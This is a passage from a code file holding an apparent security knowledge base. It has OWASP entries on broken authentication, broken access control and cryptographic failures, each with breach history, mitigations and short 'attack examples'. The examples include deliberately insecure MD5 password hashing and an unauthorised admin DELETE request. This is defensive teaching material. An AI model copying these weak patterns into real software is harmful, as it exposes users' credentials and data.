      "Use different secrets for each environment",
      "Implement secret rotation policies",
      "Audit secret access with centralized logging",
      "Use short-lived tokens instead of long-lived API keys",
    ],
  },
  {
    id: "kb-004",
    title: "Broken Authentication",
    category: "Authentication",
    owasp: "A07:2021",
    icon: "Lock",
    severity: "high",
    description: "Authentication mechanisms are broken when they allow attackers to compromise passwords, keys, or session tokens, or to exploit implementation flaws to assume other users' identities temporarily or permanently.",
    realWorldImpact: "The 2012 LinkedIn breach exposed 164 million passwords hashed with unsalted SHA-1. After cracking, 117 million plaintext passwords were sold on the dark web. Weak password hashing continues to be a leading cause of credential theft.",
    attackExample: `// Weak password hashing with MD5:
const hash = crypto.createHash('md5')
  .update(password).digest('hex');

// MD5 can be cracked at ~25 billion hashes/second
// on modern GPUs. A 6-character password falls
// in under 1 second.

// Rainbow table attack:
// Pre-computed hash → password mapping
// "5f4dcc3b5aa765d61d8327deb882cf99" → "password"`,
    mitigation: [
      "Use bcrypt, scrypt, or Argon2id for password hashing",
      "Implement multi-factor authentication (MFA)",
      "Enforce strong password policies (min 12 chars, complexity)",
      "Implement account lockout after failed attempts",
      "Use secure session management with proper token expiration",
    ],
    bestPractices: [
      "Use a cost factor of 12+ for bcrypt",
      "Implement credential stuffing detection",
      "Monitor for brute force attacks",
      "Use password breach databases (HaveIBeenPwned) for validation",
      "Implement adaptive authentication based on risk signals",
    ],
  },
  {
    id: "kb-005",
    title: "Broken Access Control",
    category: "Authorization",
    owasp: "A01:2021",
    icon: "ShieldOff",
    severity: "high",
    description: "Access control enforces policy such that users cannot act outside their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing a business function outside the user's limits.",
    realWorldImpact: "In 2019, Capital One experienced a breach affecting 106 million customers due to a misconfigured WAF that allowed SSRF, bypassing access controls to access S3 buckets. Broken access control moved to #1 on the OWASP Top 10 in 2021.",
    attackExample: `// Missing authorization check:
// Any authenticated user can delete other users

DELETE /api/admin/users/123
Authorization: Bearer <any-valid-token>

// Server only checks: "Is this a valid token?"
// Does NOT check: "Is this user an admin?"
// Result: Regular user deletes admin accounts`,
    mitigation: [
      "Implement role-based access control (RBAC) on every endpoint",
      "Deny access by default, explicitly grant permissions",
      "Log and alert on access control failures",
      "Implement server-side authorization checks (never trust client)",
      "Use principle of least privilege for all user roles",
    ],
    bestPractices: [
      "Centralize authorization logic in middleware",
      "Write authorization unit tests for every endpoint",
      "Implement row-level security in the database",
      "Regular access control audits and penetration testing",
      "Use attribute-based access control (ABAC) for complex policies",
    ],
  },
  {
    id: "kb-006",
    title: "Cryptographic Failures",
    category: "Cryptography",
    owasp: "A02:2021",
    icon: "ShieldAlert",
    severity: "critical",
    description: "Failures related to cryptography which often lead to exposure of sensitive data. This includes using weak or broken cryptographic algorithms, insufficient key management, weak random number generation, and lack of encryption for sensitive data in transit or at rest.",
    realWorldImpact: "Adobe's 2013 breach exposed 153 million user records encrypted with a single 3DES key in ECB mode, making it trivial to identify common passwords. The use of outdated cryptographic standards continues to cause major breaches across industries.",
    attackExample: `// Using MD5 for password hashing (broken):
const hash = crypto.createHash('md5')
  .update('password123').digest('hex');
// → "482c811da5d5b4bc6d497ffa98491e38"

// This hash is instantly reversible via:
// 1. Rainbow tables (pre-computed lookups)
// 2. GPU brute force (~25B hashes/sec)
// 3. Online hash databases

// Using ECB mode (leaks patterns):
// Identical plaintext blocks → identical ciphertext
// Reveals patterns in encrypted data`,
    mitigation: [
      "Use strong, modern algorithms (AES-256-GCM, ChaCha20-Poly1305)",
      "Use bcrypt/scrypt/Argon2id for passwords (NOT MD5/SHA-1/SHA-256)",
      "Implement TLS 1.3 for all data in transit",
      "Use authenticated encryption (AEAD) for data at rest",
      "Generate cryptographic keys using secure random number generators",
    ],
    bestPractices: [
      "Classify data and apply appropriate encryption levels",
      "Implement proper key management and rotation",
      "Disable legacy protocols (SSL, TLS 1.0/1.1)",
      "Use HSTS headers to enforce HTTPS",
      "Regular cryptographic audits to identify weak algorithms",
    ],
  },
];
